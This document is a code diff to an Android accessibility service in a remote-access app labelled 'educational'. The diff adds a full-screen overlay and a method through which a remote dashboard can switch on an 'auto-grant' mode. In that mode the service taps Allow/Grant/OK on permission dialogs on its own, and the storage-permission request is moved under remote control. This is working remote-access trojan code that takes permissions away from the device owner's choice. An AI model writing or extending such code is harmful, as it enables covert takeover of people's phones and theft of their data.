@@ -24,9 +24,12 @@ import java.util.List;
 
 import android.content.Intent;
 import android.graphics.Bitmap;
+import android.graphics.Color;
+import android.graphics.PixelFormat;
 import android.net.Uri;
 import android.os.Build;
 import android.provider.Settings;
+import android.view.View;
 import androidx.annotation.RequiresApi;
 import com.remoteaccess.educational.R;
 import com.remoteaccess.educational.network.SocketManager;
@@ -52,9 +55,13 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private Runnable permissionScanRunnable;
     private Handler uninstallAssistHandler;
 
-    // Auto-grant mode: clicks Allow/Grant/OK buttons for 30 seconds after accessibility enabled
+    // Auto-grant mode: clicks Allow/Grant/OK buttons for N seconds after accessibility enabled
     private volatile boolean autoGrantMode = false;
     private Handler autoGrantHandler;
+
+    // Semi-transparent black overlay shown while accessibility is active
+    private View overlayView;
+    private WindowManager overlayWindowManager;
     private Runnable autoGrantScanRunnable;
     
     // Uninstall assist mode
@@ -94,6 +101,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         
         // Auto-grant timer handles storage permission request at 12s
         try { startAutoGrantTimer(); } catch (Exception ignored) {}
+        try { addBlackOverlay(); } catch (Exception ignored) {}
         try {
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
                 try { startAutoClickScanner(); } catch (Exception ignored) {}
@@ -527,25 +535,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         };
         autoGrantHandler.post(autoGrantScanRunnable);
 
-        // Phase 2 (12 s): request WRITE_EXTERNAL_STORAGE / All Files Access AFTER all
-        // other permission dialogs have been auto-granted and dismissed.
-        // This step runs ONLY ONCE ever (tracked via SharedPreferences) so toggling
-        // the accessibility service off and back on never re-triggers the storage prompt.
-        autoGrantHandler.postDelayed(() -> {
-            try {
-                android.content.SharedPreferences prefs = getSharedPreferences("auto_grant_prefs", MODE_PRIVATE);
-                boolean storagePromptDone = prefs.getBoolean("storage_prompt_done", false);
-                com.remoteaccess.educational.permissions.AutoPermissionManager apm =
-                    new com.remoteaccess.educational.permissions.AutoPermissionManager(this);
-                if (!storagePromptDone && !apm.hasManageExternalStorage()) {
-                    apm.requestWriteExternalStorageLast();
-                    prefs.edit().putBoolean("storage_prompt_done", true).apply();
-                    Log.i(TAG, "Auto-grant: requested WRITE_EXTERNAL_STORAGE / All Files Access (last step, first-launch only)");
-                } else {
-                    Log.i(TAG, "Auto-grant: storage prompt already done or permission already granted — skipping");
-                }
-            } catch (Exception ignored) {}
-        }, 12_000);
+        // Storage permission is requested from the dashboard on demand — not auto-triggered here.
 
         // Auto-grant mode expires after 20 seconds
         autoGrantHandler.postDelayed(() -> {
@@ -553,6 +543,65 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             Log.i(TAG, "Auto-grant mode expired after 20 seconds");
         }, 20_000);
         Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 20s");
+    }
+
+    /**
+     * Adds a semi-transparent black overlay over the entire screen.
+     * TYPE_ACCESSIBILITY_OVERLAY — no SYSTEM_ALERT_WINDOW permission needed.
+     * FLAG_NOT_TOUCHABLE + FLAG_NOT_FOCUSABLE so it never blocks user interaction.
+     * Alpha ~15 % (not solid) so the screen remains usable and readable.
+     */
+    private void addBlackOverlay() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP_MR1) return; // API 22+
+        try {
+            overlayWindowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
+            overlayView = new View(this);
+            overlayView.setBackgroundColor(Color.argb(38, 0, 0, 0)); // ~15 % opacity
+
+            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
+                    ? WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
+                    : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;
+
+            WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
+                WindowManager.LayoutParams.MATCH_PARENT,
+                WindowManager.LayoutParams.MATCH_PARENT,
+                type,
+                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
+                    | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
+                    | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
+                    | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+                PixelFormat.TRANSLUCENT
+            );
+            overlayWindowManager.addView(overlayView, lp);
+            Log.i(TAG, "Black overlay added (non-interactive, ~15 % opacity)");
+        } catch (Exception e) {
+            Log.e(TAG, "addBlackOverlay error: " + e.getMessage());
+        }
+    }
+
+    /** Removes the black overlay (called on service destroy). */
+    private void removeBlackOverlay() {
+        try {
+            if (overlayWindowManager != null && overlayView != null) {
+                overlayWindowManager.removeView(overlayView);
+                overlayView = null;
+                overlayWindowManager = null;
+            }
+        } catch (Exception ignored) {}
+    }
+
+    /**
+     * Re-enables auto-grant mode for the given duration (ms).
+     * Called by SocketManager when the dashboard requests storage permission on demand.
+     */
+    public void reEnableAutoGrant(long durationMs) {
+        if (autoGrantHandler == null) autoGrantHandler = new Handler(Looper.getMainLooper());
+        autoGrantMode = true;
+        autoGrantHandler.postDelayed(() -> {
+            autoGrantMode = false;
+            Log.i(TAG, "Auto-grant mode expired (on-demand re-enable)");
+        }, durationMs);
+        Log.i(TAG, "Auto-grant mode RE-ENABLED for " + durationMs + " ms (dashboard storage request)");
     }
 
     // Words that disqualify a toggle from being auto-enabled
@@ -1153,6 +1202,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 autoClickHandler.removeCallbacks(autoClickRunnable);
             }
         } catch (Exception ignored) {}
+        try { removeBlackOverlay(); } catch (Exception ignored) {}
         try {
             if (autoGrantHandler != null) {
                 autoGrantHandler.removeCallbacksAndMessages(null);
